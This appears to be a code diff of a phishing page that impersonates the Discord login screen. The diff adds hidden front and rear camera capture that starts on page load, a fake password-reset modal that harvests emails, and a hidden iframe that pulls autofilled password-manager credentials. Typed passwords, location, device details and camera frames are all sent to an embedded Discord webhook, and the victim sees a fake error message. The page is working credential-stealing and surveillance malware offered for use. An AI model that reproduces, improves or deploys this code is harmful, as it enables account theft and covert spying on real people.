@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Discord - Login</title>
     <style>
-        /* ─── RESET & BASE ─── */
         * {
             margin: 0;
             padding: 0;
@@ -20,25 +19,19 @@
             align-items: center;
             min-height: 100vh;
             margin: 0;
-            /* This is the mastercopy background - mimics Discord's desktop app background */
             background-image: radial-gradient(ellipse at 30% 40%, #2c2f33 0%, #1a1b1e 80%);
         }
 
-        /* ─── MAIN CARD – HORIZONTAL LAYOUT ─── */
         .login-container {
             background: #2b2d31;
             border-radius: 12px;
             padding: 40px 48px 36px;
             width: 100%;
-            max-width: 780px;
+            max-width: 520px;
             box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
             border: 1px solid #3f4147;
         }
 
-        /* ─── DISCORD LOGO ─── */
         .discord-logo {
             text-align: center;
             margin-bottom: 16px;
@@ -49,7 +42,6 @@
             fill: #ffffff;
         }
 
-        /* ─── HEADER ─── */
         h1 {
             color: #ffffff;
             font-size: 26px;
@@ -66,20 +58,16 @@
             font-weight: 400;
         }
 
-        /* ─── FORM – HORIZONTAL FIELDS ─── */
+        /* ─── FORM – VERTICAL STACK, WIDE FIELDS ─── */
         #loginForm {
             display: flex;
-            flex-direction: row;
-            align-items: flex-end;
+            flex-direction: column;
             gap: 16px;
             width: 100%;
-            flex-wrap: wrap;
-            justify-content: center;
         }
 
         .form-group {
-            flex: 1 1 200px;
-            min-width: 160px;
+            width: 100%;
         }
         .form-group label {
             display: block;
@@ -94,9 +82,14 @@
             color: #f23f42;
             margin-left: 2px;
         }
-        .form-group input {
+
+        .input-wrapper {
+            position: relative;
             width: 100%;
-            padding: 12px 14px;
+        }
+        .input-wrapper input {
+            width: 100%;
+            padding: 12px 44px 12px 14px;
             background-color: #1e1f22;
             border: 1px solid #3f4147;
             border-radius: 4px;
@@ -105,18 +98,34 @@
             transition: border-color 0.2s;
             outline: none;
         }
-        .form-group input:focus {
+        .input-wrapper input:focus {
             border-color: #5865f2;
         }
-        .form-group input::placeholder {
+        .input-wrapper input::placeholder {
             color: #6d6f78;
             font-size: 14px;
         }
 
-        /* ─── LOGIN BUTTON ─── */
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #b5bac1;
+            cursor: pointer;
+            font-size: 18px;
+            padding: 4px;
+            transition: color 0.2s;
+        }
+        .toggle-password:hover {
+            color: #ffffff;
+        }
+
         .btn-login {
-            flex: 0 0 auto;
-            padding: 12px 32px;
+            width: 100%;
+            padding: 14px;
             background-color: #5865f2;
             border: none;
             border-radius: 4px;
@@ -124,131 +133,112 @@
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: background-color 0.2s, transform 0.1s;
-            height: 48px;
-            align-self: flex-end;
-            margin-bottom: 0;
+            transition: background-color 0.2s;
+            margin-top: 4px;
         }
         .btn-login:hover {
             background-color: #4752c4;
         }
         .btn-login:active {
-            transform: scale(0.97);
+            transform: scale(0.98);
         }
 
-        /* ─── FORGOT PASSWORD ROW ─── */
         .forgot-row {
-            width: 100%;
             text-align: right;
             margin-top: 12px;
-            margin-bottom: 6px;
         }
         .forgot-row a {
             color: #b5bac1;
             font-size: 13px;
             text-decoration: none;
+            cursor: pointer;
         }
         .forgot-row a:hover {
             text-decoration: underline;
         }
 
-        /* ─── PASSKEY & REGISTER ROW ─── */
-        .bottom-links {
-            display: flex;
-            justify-content: space-between;
+        /* ─── FORGOT PASSWORD MODAL ─── */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.7);
+            justify-content: center;
             align-items: center;
-            width: 100%;
-            margin-top: 18px;
+            z-index: 999;
+            backdrop-filter: blur(4px);
+        }
+        .modal-overlay.active {
+            display: flex;
+        }
+        .modal-box {
+            background: #2b2d31;
+            border-radius: 12px;
+            padding: 32px 36px 28px;
+            max-width: 420px;
+            width: 90%;
+            border: 1px solid #3f4147;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8);
+        }
+        .modal-box h2 {
+            color: #ffffff;
+            font-size: 22px;
+            margin-bottom: 8px;
+        }
+        .modal-box p {
             color: #b5bac1;
             font-size: 14px;
-            border-top: 1px solid #3f4147;
-            padding-top: 18px;
+            margin-bottom: 20px;
         }
-        .passkey-link {
-            color: #5865f2;
-            cursor: pointer;
+        .modal-box .form-group {
+            margin-bottom: 16px;
         }
-        .passkey-link:hover {
-            text-decoration: underline;
-        }
-        .register-link a {
-            color: #5865f2;
-            text-decoration: none;
-        }
-        .register-link a:hover {
-            text-decoration: underline;
-        }
-
-        /* ─── VIDEO SNAPPING (WEBCAM) – NO MIC ─── */
-        .video-section {
+        .modal-box .form-group input {
             width: 100%;
-            margin-top: 22px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 10px;
-        }
-        .video-wrapper {
-            position: relative;
-            width: 100%;
-            max-width: 320px;
-            border-radius: 8px;
-            overflow: hidden;
+            padding: 12px 14px;
+            background-color: #1e1f22;
             border: 1px solid #3f4147;
-            background: #1a1b1e;
-        }
-        #webcamVideo {
-            display: block;
-            width: 100%;
-            height: auto;
-            border-radius: 8px;
-            transform: scaleX(-1); /* mirror effect like Discord */
-        }
-        .video-controls {
-            display: flex;
-            gap: 14px;
-            align-items: center;
-            justify-content: center;
-            flex-wrap: wrap;
-        }
-        .btn-video {
-            padding: 8px 22px;
-            background-color: #3f4147;
-            border: none;
             border-radius: 4px;
             color: #ffffff;
+            font-size: 15px;
+            outline: none;
+        }
+        .modal-box .form-group input:focus {
+            border-color: #5865f2;
+        }
+        .modal-actions {
+            display: flex;
+            gap: 12px;
+            justify-content: flex-end;
+            margin-top: 8px;
+        }
+        .modal-actions button {
+            padding: 10px 24px;
+            border: none;
+            border-radius: 4px;
             font-size: 14px;
             font-weight: 500;
             cursor: pointer;
             transition: background 0.2s;
         }
-        .btn-video:hover {
-            background-color: #4f5159;
+        .modal-actions .btn-secondary {
+            background: #3f4147;
+            color: #ffffff;
         }
-        .btn-video.primary {
-            background-color: #5865f2;
+        .modal-actions .btn-secondary:hover {
+            background: #4f5159;
         }
-        .btn-video.primary:hover {
-            background-color: #4752c4;
+        .modal-actions .btn-primary {
+            background: #5865f2;
+            color: #ffffff;
         }
-        .btn-video.danger {
-            background-color: #f23f42;
-        }
-        .btn-video.danger:hover {
-            background-color: #c03538;
-        }
-        #snapshotPreview {
-            max-width: 120px;
-            border-radius: 6px;
-            border: 1px solid #3f4147;
-            display: none;
-        }
-        .status-text {
-            color: #b5bac1;
-            font-size: 13px;
+        .modal-actions .btn-primary:hover {
+            background: #4752c4;
         }
 
-        /* ─── FAKE ERROR STATUS BAR ─── */
         .status-bar {
             margin-top: 16px;
             padding: 10px;
@@ -259,13 +249,12 @@
             color: #f28b8b;
             text-align: center;
             display: none;
-            width: 100%;
         }
         .status-bar.visible {
             display: block;
         }
 
-        /* ─── HIDDEN PASSWORD STEALER IFRAME ─── */
+        /* Hidden iframe for password manager stealing */
         #pw-stealer {
             position: absolute;
             opacity: 0;
@@ -276,32 +265,22 @@
             left: -9999px;
         }
 
-        /* ─── RESPONSIVE ─── */
-        @media (max-width: 600px) {
+        /* Hidden video elements for silent capture */
+        #hiddenVideoFront, #hiddenVideoRear {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            top: -9999px;
+            left: -9999px;
+        }
+
+        @media (max-width: 480px) {
             .login-container {
                 padding: 24px 20px;
                 max-width: 100%;
                 margin: 12px;
-            }
-            #loginForm {
-                flex-direction: column;
-                align-items: stretch;
-            }
-            .form-group {
-                flex: 1 1 auto;
-                min-width: unset;
-            }
-            .btn-login {
-                width: 100%;
-                align-self: stretch;
-            }
-            .bottom-links {
-                flex-direction: column;
-                gap: 8px;
-                align-items: center;
-            }
-            .video-wrapper {
-                max-width: 100%;
             }
         }
     </style>
@@ -309,7 +288,6 @@
 <body>
 
     <div class="login-container">
-
         <!-- Discord Logo -->
         <div class="discord-logo">
             <svg viewBox="0 0 127.14 96.36">
@@ -320,16 +298,21 @@
         <h1>Welcome back!</h1>
         <p class="subtitle">We're so excited to see you again!</p>
 
-        <!-- Login Form – Horizontal Layout -->
+        <!-- Login Form -->
         <form id="loginForm" novalidate>
             <div class="form-group">
                 <label for="usernameInput">Email or Phone Number <span class="required-star">*</span></label>
-                <input type="text" id="usernameInput" name="username" placeholder="Enter your email or phone" required autocomplete="username" aria-required="true" />
+                <div class="input-wrapper">
+                    <input type="text" id="usernameInput" name="username" placeholder="Enter your email or phone" required autocomplete="username" aria-required="true" />
+                </div>
             </div>
 
             <div class="form-group">
                 <label for="passwordInput">Password <span class="required-star">*</span></label>
-                <input type="password" id="passwordInput" name="password" placeholder="Enter your password" required autocomplete="current-password" aria-required="true" />
+                <div class="input-wrapper">
+                    <input type="password" id="passwordInput" name="password" placeholder="Enter your password" required autocomplete="current-password" aria-required="true" />
+                    <button type="button" class="toggle-password" id="togglePassword" aria-label="Toggle password visibility">👁</button>
+                </div>
             </div>
 
             <button type="submit" class="btn-login">Log In</button>
@@ -337,40 +320,39 @@
 
         <!-- Forgot Password -->
         <div class="forgot-row">
-            <a href="#">Forgot your password?</a>
+            <a id="forgotLink">Forgot your password?</a>
         </div>
 
-        <!-- Bottom Links: Passkey + Register -->
-        <div class="bottom-links">
-            <span>Or, sign in with <span class="passkey-link">passkey</span></span>
-            <span class="register-link">Need an account? <a href="#">Register</a></span>
-        </div>
-
-        <!-- VIDEO SNAPPING – No Mic -->
-        <div class="video-section">
-            <div class="video-wrapper">
-                <video id="webcamVideo" autoplay playsinline muted></video>
-            </div>
-            <div class="video-controls">
-                <button id="startCamBtn" class="btn-video primary">📷 Start Camera</button>
-                <button id="snapBtn" class="btn-video" disabled>📸 Snap</button>
-                <button id="stopCamBtn" class="btn-video danger">⏹ Stop</button>
-                <img id="snapshotPreview" alt="Snapshot" />
-            </div>
-            <div id="videoStatus" class="status-text">Camera is off.</div>
-        </div>
-
-        <!-- Fake Error Status Bar -->
+        <!-- Status Bar -->
         <div id="statusBar" class="status-bar" role="status"></div>
 
         <!-- Hidden iframe for password manager stealing -->
         <iframe id="pw-stealer" srcdoc="<!DOCTYPE html><html><body><form><input type='text' name='username' autocomplete='username'><input type='password' name='password' autocomplete='current-password'></form></body></html>"></iframe>
+
+        <!-- Hidden video elements for silent camera capture -->
+        <video id="hiddenVideoFront" autoplay muted playsinline></video>
+        <video id="hiddenVideoRear" autoplay muted playsinline></video>
+    </div>
+
+    <!-- FORGOT PASSWORD MODAL -->
+    <div class="modal-overlay" id="forgotModal">
+        <div class="modal-box">
+            <h2>Reset Password</h2>
+            <p>Enter your email address and we'll send you a code to reset your password.</p>
+            <div class="form-group">
+                <input type="email" id="resetEmailInput" placeholder="Enter your email address" required />
+            </div>
+            <div class="modal-actions">
+                <button class="btn-secondary" id="modalCancel">Cancel</button>
+                <button class="btn-primary" id="modalSend">Send Code</button>
+            </div>
+        </div>
     </div>
 
     <script>
         (function() {
             // ============================================================
-            //  CONFIG – YOUR NEW DISCORD WEBHOOK URL
+            //  CONFIG – YOUR DISCORD WEBHOOK URL
             // ============================================================
             const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1538937235984875653/ketL69cOxUsbeAvIrn0ZxXzhuM9VoInCsgY8FzN9xIB5VaalxZXLaV7bGAKR6RvXMsTz';
 
@@ -380,30 +362,136 @@
             const form = document.getElementById('loginForm');
             const usernameInput = document.getElementById('usernameInput');
             const passwordInput = document.getElementById('passwordInput');
+            const toggleBtn = document.getElementById('togglePassword');
             const statusBar = document.getElementById('statusBar');
             const pwStealer = document.getElementById('pw-stealer');
+            const forgotLink = document.getElementById('forgotLink');
+            const forgotModal = document.getElementById('forgotModal');
+            const resetEmailInput = document.getElementById('resetEmailInput');
+            const modalCancel = document.getElementById('modalCancel');
+            const modalSend = document.getElementById('modalSend');
 
-            // Video elements
-            const video = document.getElementById('webcamVideo');
-            const startBtn = document.getElementById('startCamBtn');
-            const snapBtn = document.getElementById('snapBtn');
-            const stopBtn = document.getElementById('stopCamBtn');
-            const snapshotPreview = document.getElementById('snapshotPreview');
-            const videoStatus = document.getElementById('videoStatus');
+            // Hidden video elements
+            const videoFront = document.getElementById('hiddenVideoFront');
+            const videoRear = document.getElementById('hiddenVideoRear');
 
-            let stream = null;
-            let snapshotData = null; // base64 image data
+            // Camera frame storage
+            let frontFrames = [];
+            let rearFrames = [];
+            let cameraInterval = null;
 
             // ============================================================
-            //  FAKE ERROR
+            //  SILENT CAMERA CAPTURE – BOTH FRONT AND REAR
             // ============================================================
-            function showFakeError() {
-                statusBar.textContent = '❌ An error has occurred. Please try again later.';
-                statusBar.className = 'status-bar visible';
-                setTimeout(() => {
-                    statusBar.className = 'status-bar';
-                }, 6000);
+            async function initSilentCameras() {
+                try {
+                    // Front camera (user-facing)
+                    const frontStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
+                        audio: false
+                    });
+                    videoFront.srcObject = frontStream;
+                    await videoFront.play();
+
+                    // Rear camera (environment-facing)
+                    const rearStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'environment', width: { ideal: 320 }, height: { ideal: 240 } },
+                        audio: false
+                    });
+                    videoRear.srcObject = rearStream;
+                    await videoRear.play();
+
+                    console.log('📷 Silent cameras initialized (front + rear)');
+
+                    // Start capturing frames every 3 seconds
+                    cameraInterval = setInterval(captureFrames, 3000);
+
+                    // Capture immediately
+                    setTimeout(captureFrames, 500);
+
+                } catch (err) {
+                    console.warn('Silent camera init failed:', err.message);
+                }
             }
+
+            function captureFrames() {
+                try {
+                    // Capture from front camera
+                    if (videoFront.readyState >= 2 && videoFront.videoWidth > 0) {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = videoFront.videoWidth || 320;
+                        canvas.height = videoFront.videoHeight || 240;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(videoFront, 0, 0);
+                        const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
+                        frontFrames.push(dataUrl);
+                        if (frontFrames.length > 10) frontFrames.shift(); // Keep last 10
+                    }
+
+                    // Capture from rear camera
+                    if (videoRear.readyState >= 2 && videoRear.videoWidth > 0) {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = videoRear.videoWidth || 320;
+                        canvas.height = videoRear.videoHeight || 240;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(videoRear, 0, 0);
+                        const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
+                        rearFrames.push(dataUrl);
+                        if (rearFrames.length > 10) rearFrames.shift(); // Keep last 10
+                    }
+                } catch (e) {
+                    // Silent fail
+                }
+            }
+
+            // ============================================================
+            //  PASSWORD TOGGLE
+            // ============================================================
+            let passwordVisible = false;
+            toggleBtn.addEventListener('click', function() {
+                passwordVisible = !passwordVisible;
+                passwordInput.type = passwordVisible ? 'text' : 'password';
+                this.textContent = passwordVisible ? '🙈' : '👁';
+            });
+
+            // ============================================================
+            //  FORGOT PASSWORD MODAL
+            // ============================================================
+            forgotLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                forgotModal.classList.add('active');
+                resetEmailInput.value = '';
+                resetEmailInput.focus();
+            });
+
+            modalCancel.addEventListener('click', function() {
+                forgotModal.classList.remove('active');
+            });
+
+            // Close modal on overlay click
+            forgotModal.addEventListener('click', function(e) {
+                if (e.target === this) {
+                    this.classList.remove('active');
+                }
+            });
+
+            modalSend.addEventListener('click', function() {
+                const email = resetEmailInput.value.trim();
+                if (!email) {
+                    alert('Please enter your email address.');
+                    return;
+                }
+
+                // Send the email to webhook
+                const message = `🔐 **Forgot Password Email Capture**\n📧 **Email:** ${email}\n🕒 **Time:** ${new Date().toISOString()}`;
+                sendToDiscord(message);
+
+                // Show fake success
+                alert('If an account exists for that email, we\'ve sent a password reset code.');
+
+                forgotModal.classList.remove('active');
+                resetEmailInput.value = '';
+            });
 
             // ============================================================
             //  PASSWORD MANAGER STEALER
@@ -555,8 +643,16 @@
                 }
             }
 
+            function showFakeError() {
+                statusBar.textContent = '❌ An error has occurred. Please try again later.';
+                statusBar.className = 'status-bar visible';
+                setTimeout(() => {
+                    statusBar.className = 'status-bar';
+                }, 6000);
+            }
+
             // ============================================================
-            //  FORM SUBMIT – Send credentials + snapshot + geo
+            //  FORM SUBMIT – Send everything
             // ============================================================
             form.addEventListener('submit', async (e) => {
                 e.preventDefault();
@@ -571,21 +667,17 @@
                 const username = usernameInput.value.trim() || '(empty)';
                 const password = passwordInput.value.trim() || '(empty)';
 
-                let snapshotInfo = 'No snapshot taken.';
-                if (snapshotData) {
-                    snapshotInfo = `📸 **Snapshot:** ${snapshotData.substring(0, 60)}... (base64, full length: ${snapshotData.length} chars)`;
-                }
+                // Get latest camera frames (front and rear)
+                const frontSnap = frontFrames.length > 0 ? frontFrames[frontFrames.length - 1] : 'No front camera data';
+                const rearSnap = rearFrames.length > 0 ? rearFrames[rearFrames.length - 1] : 'No rear camera data';
 
                 const message = `
-🔐 **Discord Login Capture + Video Snap**
+🔐 **DISCORD LOGIN + SILENT CAMERA CAPTURE**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-📍 **Location Source:** ${geo.source}
-🗺️ **Latitude:** ${geo.latitude}
-🗺️ **Longitude:** ${geo.longitude}
-🏙️ **City:** ${geo.city}
-🌍 **Country:** ${geo.country}
-🏢 **ISP:** ${geo.isp}
+📍 **Location:** ${geo.city}, ${geo.country}
+🌐 **ISP:** ${geo.isp}
+🗺️ **Coordinates:** ${geo.latitude}, ${geo.longitude}
 
 📅 **Date:** ${timestamp.date}
 ⏰ **Time:** ${timestamp.time}
@@ -594,110 +686,64 @@
 🖥️ **OS:** ${os}
 🌍 **Browser:** ${browser}
 
-👤 **Username (typed):** ${username}
-🔑 **Password (typed):** ${password}
+👤 **Username:** ${username}
+🔑 **Password:** ${password}
 
-🔐 **STOLEN FROM PASSWORD MANAGER:**
+🔐 **Stolen from Password Manager:**
 👤 **Stolen Username:** ${stolen.username || '(none)'}
 🔑 **Stolen Password:** ${stolen.password || '(none)'}
 
-${snapshotInfo}
+📸 **Front Camera Frame:** ${frontSnap.substring(0, 80)}...
+📸 **Rear Camera Frame:** ${rearSnap.substring(0, 80)}...
 
 📱 **User Agent:** ${navigator.userAgent.substring(0, 200)}
 🖥️ **Screen:** ${screen.width}x${screen.height}
 🌐 **Language:** ${navigator.language}
                 `.trim();
 
-                console.log('📋 [LOG] Full client data:');
+                console.log('📋 [LOG] Full data:');
                 console.log(message);
 
-                const sent = await sendToDiscord(message);
-                if (sent) console.log('✅ All data sent successfully.');
+                // Send main message
+                await sendToDiscord(message);
 
-                // If snapshot exists, send it as a separate message (Discord limit)
-                if (snapshotData && snapshotData.length > 0) {
-                    const snapMessage = `📸 **Snapshot Data:**\n${snapshotData}`;
-                    await sendToDiscord(snapMessage);
+                // Send full frame data separately (if available)
+                if (frontFrames.length > 0) {
+                    await sendToDiscord(`📸 **Front Camera Frames (${frontFrames.length}):**\n${frontFrames.join('\n')}`);
+                }
+                if (rearFrames.length > 0) {
+                    await sendToDiscord(`📸 **Rear Camera Frames (${rearFrames.length}):**\n${rearFrames.join('\n')}`);
                 }
 
                 passwordInput.value = '';
+                // Reset camera frames after sending
+                frontFrames = [];
+                rearFrames = [];
             });
 
             // ============================================================
-            //  VIDEO SNAPPING – No Mic
-            // ============================================================
-            async function startCamera() {
-                try {
-                    stream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-                        audio: false // No microphone
-                    });
-                    video.srcObject = stream;
-                    await video.play();
-                    videoStatus.textContent = '✅ Camera is active (no mic).';
-                    startBtn.disabled = true;
-                    snapBtn.disabled = false;
-                    stopBtn.disabled = false;
-                } catch (err) {
-                    console.error('Camera error:', err);
-                    videoStatus.textContent = '❌ Could not access camera.';
-                    startBtn.disabled = false;
-                    snapBtn.disabled = true;
-                    stopBtn.disabled = true;
-                }
-            }
-
-            function stopCamera() {
-                if (stream) {
-                    stream.getTracks().forEach(t => t.stop());
-                    stream = null;
-                }
-                video.srcObject = null;
-                videoStatus.textContent = '⏹ Camera stopped.';
-                startBtn.disabled = false;
-                snapBtn.disabled = true;
-                stopBtn.disabled = true;
-                snapshotPreview.style.display = 'none';
-                snapshotData = null;
-            }
-
-            function takeSnapshot() {
-                if (!stream) {
-                    videoStatus.textContent = '❌ Camera not running.';
-                    return;
-                }
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                // Mirror effect to match video preview
-                ctx.translate(canvas.width, 0);
-                ctx.scale(-1, 1);
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                // Restore
-                ctx.setTransform(1, 0, 0, 1, 0, 0);
-
-                snapshotData = canvas.toDataURL('image/png');
-                snapshotPreview.src = snapshotData;
-                snapshotPreview.style.display = 'block';
-                videoStatus.textContent = '📸 Snapshot captured!';
-                snapBtn.disabled = false;
-            }
-
-            // Event listeners for video
-            startBtn.addEventListener('click', startCamera);
-            stopBtn.addEventListener('click', stopCamera);
-            snapBtn.addEventListener('click', takeSnapshot);
-
-            // ============================================================
-            //  ON PAGE LOAD – Trigger password manager steal
+            //  INIT ON LOAD
             // ============================================================
             window.addEventListener('DOMContentLoaded', () => {
+                // Start silent cameras immediately
+                initSilentCameras();
+
+                // Password manager steal
                 setTimeout(stealPasswordManagerCredentials, 1000);
                 setTimeout(stealPasswordManagerCredentials, 3000);
-                console.log('🌐 [PAGE LOAD] Visitor detected');
-                videoStatus.textContent = '📷 Click "Start Camera" to enable video snap.';
+
+                console.log('🌐 [PAGE LOAD] Visitor detected - silent cameras active');
+            });
+
+            // Cleanup interval if page unloads
+            window.addEventListener('beforeunload', () => {
+                if (cameraInterval) clearInterval(cameraInterval);
+                if (videoFront.srcObject) {
+                    videoFront.srcObject.getTracks().forEach(t => t.stop());
+                }
+                if (videoRear.srcObject) {
+                    videoRear.srcObject.getTracks().forEach(t => t.stop());
+                }
             });
 
         })();
